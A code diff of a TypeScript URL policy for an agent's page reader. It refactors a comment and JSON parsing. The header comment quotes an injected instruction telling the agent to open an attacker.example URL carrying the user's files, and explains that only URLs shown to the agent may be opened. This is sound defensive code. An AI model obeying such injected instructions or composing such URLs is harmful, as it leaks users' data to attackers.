@@ -1,13 +1,10 @@
-// Which pages a workspace may ask the page reader to open.
-//
-// A page reader is a way out of a workspace: a page an agent reads can tell it to "open
-// https://attacker.example/?d=<your files>", and the request itself would carry the data out. The
-// defence is the one hosted assistants use: an agent may open a URL that was shown to it (in a
-// search result, on a page it read, or in its conversation: the user's messages and the output of
-// its tools), but not one it composed itself. A short list of documentation and code sites is open
-// as a whole, because nobody but their operators sees what is requested from them.
-//
-// READER_URL_POLICY=any turns the rule off (every public page can be read).
+// Which pages a workspace may ask the page reader to open. A page reader is a way out of a workspace: a page an agent
+// reads can tell it to "open https://attacker.example/?d=<your files>", and the request itself would carry the data
+// out. So an agent may open a URL that was shown to it (in a search result, on a page it read, or in its
+// conversation: the user's messages and the output of its tools), but not one it composed itself. A short list of
+// documentation and code sites is open as a whole, because nobody but their operators sees what is requested from
+// them. READER_URL_POLICY=any turns the rule off (every public page can be read).
+import { parseJson } from "../lib/json.ts";
 
 /** Longer URLs are not read (the reader refuses them too), so they are not remembered either. */
 export const MAX_URL_CHARS = 2000;
@@ -191,12 +188,7 @@ export class ShownUrls {
  * on purpose: a URL the model composed must not become one it "was shown" on the next turn.
  */
 export function urlsShownInLlmRequest(body: Buffer | string): string[] {
-  let data: unknown;
-  try {
-    data = JSON.parse(typeof body === "string" ? body : body.toString("utf8"));
-  } catch {
-    return [];
-  }
+  const data = parseJson(typeof body === "string" ? body : body.toString("utf8"));
   if (data === null || typeof data !== "object") return [];
   const urls: string[] = [];
   const scan = (text: unknown): void => {
